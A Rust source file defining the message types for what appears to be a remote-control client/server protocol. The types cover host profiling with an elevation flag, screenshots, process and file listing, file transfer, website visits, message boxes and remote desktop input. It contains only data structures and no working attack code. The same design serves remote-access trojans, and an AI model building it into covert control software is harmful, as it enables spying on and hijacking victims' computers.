use serde::{ Serialize, Deserialize };

#[derive(Serialize, Deserialize, Debug)]
pub enum Command {
    EncryptionRequest(EncryptionRequestData),
    EncryptionResponse(EncryptionResponseData),

    InitClient,
    Client(ClientInfo),

    Reconnect,
    Disconnect,

    ScreenshotDisplay(String),
    ScreenshotResult(Vec<u8>),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ClientInfo {
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub is_elevated: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessList {
    pub processes: Vec<Process>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Process {
    pub pid: usize,
    pub name: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct File {
    pub file_type: String,
    pub name: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct FileData {
    pub name: String,
    pub data: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct EncryptionRequestData {
    pub public_key: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct EncryptionResponseData {
    pub secret: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct VisitWebsiteData {
    pub visit_type: String,
    pub url: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct MessageBoxData {
    pub title: String,
    pub message: String,
    pub button: String,
    pub icon: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RemoteDesktopConfig {
    pub display: i32,
    pub quality: u8,   // JPEG compression quality (1-100)
    pub fps: u8,       // Target frames per second
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RemoteDesktopFrame {
    pub timestamp: u64,
    pub display: i32,
    pub data: Vec<u8>, // JPEG encoded image data
}

#[derive(Serialize, Deserialize, Debug)]
pub struct MouseClickData {
    pub click_type: i32,
    pub display: i32,
    pub x: f64,
    pub y: f64,
}
